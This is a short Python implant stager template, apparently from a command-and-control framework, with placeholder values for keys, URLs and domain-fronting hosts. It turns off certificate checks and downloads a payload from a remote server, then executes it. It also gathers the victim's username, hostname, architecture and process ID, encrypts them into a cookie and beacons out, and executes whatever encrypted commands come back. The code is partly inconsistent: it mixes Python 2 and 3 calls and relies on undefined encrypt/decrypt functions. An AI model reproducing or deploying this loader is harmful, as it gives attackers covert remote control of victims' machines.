import urllib.request, urllib.error, urllib.parse,os,sys,base64,ssl,socket,pwd,hashlib,time
kd=time.strptime("#REPLACEKILLDATE#","%d/%m/%Y")
pyhash="#REPLACEPYTHONHASH#"
pykey="#REPLACESPYTHONKEY#"
key="#REPLACEKEY#"
serverclean="#REPLACEHOSTPORT#"
url="#REPLACEQUICKCOMMAND#"
url2="#REPLACECONNECTURL#"
hh="#REPLACEDOMAINFRONT#"
ua="#REPLACEUSERAGENT#"
cstr=time.strftime("%d/%m/%Y",time.gmtime());cstr=time.strptime(cstr,"%d/%m/%Y")
ssl._create_default_https_context=ssl._create_unverified_context
if hh: r=urllib.request.Request(url,headers={'Host':hh,'User-agent':ua})
else: r=urllib.request.Request(url,headers={'User-agent':ua})
res=urllib.request.urlopen(r);d=res.read();c=d[1:];b=c.decode("hex")
s=hashlib.sha512(b)
if pykey in b and pyhash == s.hexdigest() and cstr < kd: exec(b)
else: sys.exit(0)
un=pwd.getpwuid(os.getuid())[ 0 ];pid=os.getpid()
is64=sys.maxsize > 2**32;arch=('x64' if is64 == True else 'x86')
hn=socket.gethostname();o=urllib.request.build_opener()
encsid=encrypt(key, '%s;%s;%s;%s;%s;%s' % (un,hn,hn,arch,pid,serverclean))
if hh:r=urllib.request.Request(url2,headers={'Host':hh,'User-agent':ua,'Cookie':'SessionID=%s' % encsid})
else:r=urllib.request.Request(url2,headers={'User-agent':ua,'Cookie':'SessionID=%s' % encsid})
res=urllib.request.urlopen(r);html=res.read();x=decrypt(key, html).rstrip('\0');exec(x)

